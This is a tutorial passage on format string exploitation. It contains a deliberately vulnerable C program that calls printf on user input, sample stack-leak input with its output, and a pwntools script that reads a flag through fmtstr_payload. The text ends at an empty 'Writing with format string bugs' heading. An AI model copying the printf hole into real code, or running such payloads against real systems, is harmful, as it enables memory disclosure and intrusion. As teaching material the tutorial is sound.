# Format string exploits

Consider the code below:

```c
#include <stdio.h>
char flag[6] = "FLAG1\0";
char cmd[8] = "/bin/ls\0";
int list_files(){
    system(cmd);
}
int main(){
    char name[64];
    fputs("Enter name: ", stdout);
    fgets(name, 63, stdin);
    fputs("Hello: ", stdout);
    printf(name);
    list_files();
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie -fstack-protector`

[fgets()](https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm) only reads a specified number of characters, so buffer overflow is not applicable here. We can instead use a format string vulnerability.

## Printf format specifiers

[ref](https://www.cplusplus.com/reference/cstdio/printf/)

For our purposes, only `%p, %s, %n` will be useful.

| Specifier | Function                                                     | Example                                              | Explanation                                 |
| --------- | ------------------------------------------------------------ | ---------------------------------------------------- | ------------------------------------------- |
| `%p`      | Prints input as a pointer address                            | `printf("%016p", &flag)` <br>=> `0x0000000000404050` | Padded to 16 hex char (8 bytes) because x64 |
| `%s`      | Prints the data at the pointer it is passed as a string      | `printf("%s", &flag)`  <br> => FLAG1                 |                                             |
| `%n`      | Writes the number of characters printed to the pointer it is passed | `printf("12345%n", &flag)`<br>=> < no output >       | Writes 5 to the memory address of flag      |

## Exploiting printf

All format specifiers require some kind of input, passed as arguments. The first 5 arguments (for x64) are stored in the `rsi`, `rdx`, `rcx`, `r8d`, `r9d` registers (`rdi` is used for the format string). The 6th and onward arguments are stored in the stack. Thus, if no arguments are passed to `printf` but a format specifier is present, the values of `rdi` etc are used, followed by stack values. This allows us to manipulate the arguments `printf` are passed as we control some parts of the stack (the `name` buffer). Let's test it out:

```shell
➜ ./chal 
Enter name: AAAAAAAA %016p %016p %016p %016p %016p %016p %016p %016p %016p %016p 
chal  chal.c  core  script2.py  script.py
Hello: AAAAAAAA 0x0000006c6c6548 0x00000000000007 0x000000203a6f6c 0x00000000000007 0x007ffff7faeb00 0x4141414141414141 0x2520703631302520 0x3130252070363130 0x7036313025207036
```

As expected, the 6th `%p`prints `0x4141414141414141`, which is the ASCII value of `AAAAAAAA` in hex. 

We can use this to our benefit by replacing `AAAAAAAA` with the memory address of `flag` and replacing the last `%p`with `%s`.

```python
p.sendline(p64(e.symbols["flag"]) + b"%p " * 5 + b"%s")
```

However, this payload does not work. Why? 

Our payload looks something like this:

```python
b'P@@\x00\x00\x00\x00\x00%p %p %p %p %p %s'
```

There are a bunch of null bytes in the address that cause `fgets` to stop reading, thus our payload is never actually executed.

To overcome this problem, we can put the address at the back of the payload instead. However, we now need to account for the number of characters are we are using in the payload because the address is no longer at the top of the stack.

Fortunately, pwntools is able to calculate a correct payload fairly easily by using the [`fmtstr_payload`](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) function. 

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
addr = e.symbols["flag"]
context.bits = 64
payload = fmtstr_payload(6,{addr:b"A"}).replace(b"n",b"s")
p.sendline(payload)
p.interactive()
```

By default, `fmtstr_payload` tries to write to the specified address, but we only need to read it, so we replace `n` with `s`. `contex.bits` is also very important because this impacts the size of the memory address.

```
[*] Process './chal' stopped with exit code 0 (pid 14618)
Enter name: Hello:                                                                 HFLAG1aaaabaP@@
```

## Writing with format string bugs

